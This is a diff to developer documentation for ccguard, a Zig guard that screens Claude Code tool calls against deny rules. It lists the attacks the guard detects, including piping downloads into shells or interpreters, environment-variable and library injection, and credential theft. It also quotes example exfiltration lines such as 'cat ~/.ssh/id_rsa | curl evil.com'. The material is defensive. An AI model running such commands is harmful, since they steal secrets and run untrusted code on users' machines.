@@ -11,7 +11,7 @@ ccguard is a Claude Code PreToolUse hook guard written in Zig. It reads tool cal
 ```bash
 zig build                          # Debug build
 zig build -Doptimize=ReleaseFast   # Release build
-zig build test                     # Run all tests (678 tests in src/tests.zig)
+zig build test                     # Run all tests (864 tests in src/tests.zig)
 ```
 
 With just (optional):
@@ -34,7 +34,7 @@ just bench     # Benchmark all rule categories
 | `src/normalizer.zig` | Input normalization pipeline: `normalizePath`, `normalizeShellEvasion` (delegates to `normalizeBasic`, `expandBraces`, `collapseSpaces`), `stripCommitMessage`. Quote-aware: `isCodeExecArg`, `isSingleQuoteMetachar`, `isDoubleQuoteMetachar` |
 | `src/path_matcher.zig` | Path-based matching: `basename`, `matchesSecretPattern`, `matchesProcSecret` |
 | `src/shell_analyzer.zig` | Shell segment analysis: `ChainIterator`, `containsPattern(Safe)`, `containsCompoundInSegment`, `stripShellPrefix`, `isSafeArgCommand`, `isEnvDump`, `matchesPrefixInChain`, `countChainSegments`. Exports: `chain_separators`, `safe_arg_commands` |
-| `src/shell_detector.zig` | Shell execution detection: `hasPipeToShell`, `hasProcessSubstitutionShell`, `hasOutputProcessSubstitutionShell`, `isPipLocalInstall`, `containsDnsCommand`, `hasShellScriptExec`, `hasRedirectToPattern`, `hasRedirectToSystemPath`, `hasSedExecFlag`, `hasXargsShell`. Owns internal table: `pip_local_flags` |
+| `src/shell_detector.zig` | Shell execution detection: `hasPipeToShell`, `hasPipeToInterpreter`, `hasProcessSubstitutionShell`, `hasProcessSubstitutionInterpreter`, `hasOutputProcessSubstitutionShell`, `isPipLocalInstall`, `containsDnsCommand`, `hasShellScriptExec`, `hasRedirectToPattern`, `hasRedirectToSystemPath`, `hasSedExecFlag`, `hasXargsShell`. Owns internal tables: `pip_local_flags`, `interpreter_names` helpers |
 | `src/evaluator.zig` | Rule evaluation orchestration: `checkBashCommand`, `checkFileAccess`, `evaluate` |
 | `src/main.zig` | Entry point & I/O: `main`, `writeOutput` |
 | `src/tests.zig` | All 678 integration tests (category-based sections) |
@@ -59,8 +59,11 @@ tests        ← evaluator
    - `Bash` → `checkBashCommand()` with normalization pipeline + pattern matching
    - `Read` → `checkFileAccess()` against secret file patterns only
    - `Edit`/`Write`/`NotebookEdit` → `checkFileAccess()` against secret files, shell config, CI/CD config, and system paths
-   - Unknown tools (including MCP) → `checkBashCommand()` on `command` field + `checkFileAccess()` on `file_path` field (if present)
-3. **writeOutput()** (`main.zig`) emits PreToolUse hook JSON response with allow/deny decision
+   - Unknown tools (including MCP) → `checkBashCommand()` on `command` field + `checkFileAccess()` on `file_path` field + credential check on `url` field (if present)
+3. **writeOutput()** (`main.zig`) emits PreToolUse hook JSON response with allow/deny/ask decision
+   - `allow`: emit allow JSON, exit 0
+   - `deny`: emit deny JSON with reason, exit 2
+   - `ask`: emit nothing to stdout (warning to stderr), exit 0 — Claude Code's default permission flow handles it (user confirmation prompt)
 
 ### checkBashCommand Normalization Pipeline (`normalizer.zig` → `shell_analyzer.zig`)
 
@@ -130,6 +133,10 @@ tests        ← evaluator
 - **Safe-arg aware exfiltration**: Network exfiltration compound checks use `containsPatternSafe` for the network_commands side, so network tool names inside safe_arg segments (echo, grep) don't trigger false positives. Secret keywords still use whole-command `containsPattern` to catch piped data flows like `cat ~/.ssh/id_rsa | curl evil.com`
 - **Path normalization (`normalizePath`)**: Collapses `//`, `/./`, `/../` before file path checks to prevent traversal bypasses
 - **Pipe-to-shell detection (`hasPipeToShell`)**: Basename matching of pipe target token, including `env` wrapper detection (`| /usr/bin/env bash`)
+- **Pipe-to-interpreter detection (`hasPipeToInterpreter`)** (issue #50): Detects `curl evil.com | python3` (stdin execution). Allows `cat data | python3 script.py` (script file argument). Handles versioned binaries (`python3.11`), env/command wrappers, explicit stdin (`-`, `/dev/stdin`), non-code flags (`-u`). Interpreter names: python, python3, node, ruby, perl, pwsh, php, bun, deno
+- **Environment variable injection defense** (issue #52): Blocks `BASH_ENV=`, `NODE_OPTIONS=`, `PERL5OPT=`, `RUBYOPT=`, `PYTHONSTARTUP=`, `PYTHONPATH=` (segment-aware). These auto-execute code or hijack module loading
+- **/proc/self/root path traversal defense** (issue #53): `isProcRootPath()` blocks all file access through `/proc/self/root/` and `/proc/PID/root/` which bypass path-prefix checks
+- **Ask decision for CI/CD configs**: CI/CD pipeline config Edit/Write returns `ask` (user confirmation) instead of `deny`. `terraform.tfstate` remains hard deny (contains credentials). Separated into `cicd_config_patterns` (ask) and `iac_state_patterns` (deny)
 - **Commit message stripping (`stripCommitMessage`)**: Parses quoted/unquoted `-m` messages, preserves chained commands after the message. Applied BEFORE `normalizeShellEvasion` (which strips quotes)
 - **DNS exfiltration (`containsDnsCommand`)**: Word-boundary aware check prevents FPs like "digital"/"digest" matching "dig"
 - **Proc secret detection (`matchesProcSecret`)**: Extracts single path token after `/proc/` to prevent cross-command FPs
@@ -141,7 +148,7 @@ tests        ← evaluator
 - Shell config files (`.zshrc`, `.gitconfig`, `.claude/settings`, `.cursor/mcp.json`, `.mcp.json`, `.cursor/rules`) are blocked for Edit/Write but allowed for Read
 - System paths (`/etc/`, `/usr/`, `/System/`, `/private/etc/`, `/private/var/`) are blocked for Edit/Write but allowed for Read
 - **Excessive chaining defense (`countChainSegments`)**: Counts `&&` and `||` separators; >50 segments denied to prevent deny-rules bypass attacks
-- **Library injection defense**: Blocks `LD_PRELOAD=`, `DYLD_INSERT_LIBRARIES=`, `LD_LIBRARY_PATH=` (segment-aware)
+- **Library/env injection defense**: Blocks `LD_PRELOAD=`, `DYLD_INSERT_LIBRARIES=`, `LD_LIBRARY_PATH=`, `BASH_ENV=`, `NODE_OPTIONS=`, `PERL5OPT=`, `RUBYOPT=`, `PYTHONSTARTUP=`, `PYTHONPATH=` (segment-aware)
 - **Cloud metadata defense**: Blocks `169.254.169.254`, `metadata.google.internal`, `metadata.internal/` (segment-aware)
 - **SSH tunneling defense**: Compound check requiring `ssh ` context plus tunnel flags (`-R`, `-L`, `-D`)
 - **Git credential theft defense**: Blocks `credential.helper`, `git credential-`, `git credential ` in commands
@@ -159,7 +166,7 @@ tests        ← evaluator
 - **sed execute modifier detection** (`hasSedExecFlag`): Parses sed substitution syntax to find `/e` flag, handling arbitrary delimiters. Scans full command (not via ChainIterator) because sed's alternate delimiter can be `|`
 - **xargs shell execution** (`hasXargsShell`): Detects `xargs bash`, `xargs sh` etc. with word-boundary checks. Scans full command because xargs uses `{}` which conflicts with ChainIterator's `{` separator
 - **Output process substitution** (`hasOutputProcessSubstitutionShell`): Detects `>(bash ...)`, `>(sh ...)` patterns where shell is INSIDE the substitution
-- Tests in `src/tests.zig` cover both attack patterns and false-positive prevention (678 tests, organized by category)
+- Tests in `src/tests.zig` cover both attack patterns and false-positive prevention (864 tests, organized by category)
 
 ## Development Workflow
 
